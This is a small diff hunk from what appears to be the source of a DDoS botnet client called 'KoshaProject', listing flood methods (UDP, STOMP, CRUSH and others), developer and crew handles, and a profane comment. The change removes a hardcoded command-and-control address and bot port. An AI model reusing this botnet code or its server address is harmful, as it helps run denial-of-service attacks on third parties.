@@ -45,7 +45,7 @@
 #define Developer ["FlexingOnLamers", "GeorgiaCri"]
 #define methods "UDP, STOMP, CRUSH, STDP, TCP, STD"
 
-unsigned char *KoshaProject[] = {"185.244.25.189:23"}; // <ServerIP>:<BotPort> || <185.244.25.189:23>
+ 
 // OwO Whos this! Its the team!!!! || Why is all of this here you ask? simply because im baked off my ass and you guys made me code this motherfucker (':
 ////////////////////////////////////////
 char *crew = "cri, kgfl, resentual, soap, dark, swizz";
